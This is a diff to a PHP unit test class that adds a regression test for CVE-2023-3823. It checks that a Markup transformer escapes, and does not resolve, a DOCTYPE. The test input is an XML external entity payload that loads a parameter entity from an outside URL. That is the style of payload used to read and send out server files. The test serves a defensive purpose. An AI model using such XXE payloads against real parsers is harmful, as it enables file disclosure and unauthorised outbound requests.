@@ -110,7 +110,16 @@ class MarkupTest {
   public function does_not_parse_doctype_with($entity) {
     Assert::equals(
       "]&gt;\n<p>&amp;xxe;</p>",
-      new Markup()->transform("<!DOCTYPE results [{$entity}]>\n<p>&xxe;</p>")
+      new Markup()->transform("<!DOCTYPE results [{$entity}]>\n<p>&xxe;</p>"),
+    );
+  }
+
+  #[Test]
+  public function CVE_2023_3823() {
+    $entity= '<!ENTITY % remote SYSTEM "https://bin.icewind.me/r/p0gzLJ"> %remote; %intern; n%trick;';
+    Assert::equals(
+      ' %remote; %intern; n%trick;]&gt;',
+      new Markup()->transform("<!DOCTYPE root [{$entity}]>"),
     );
   }
 
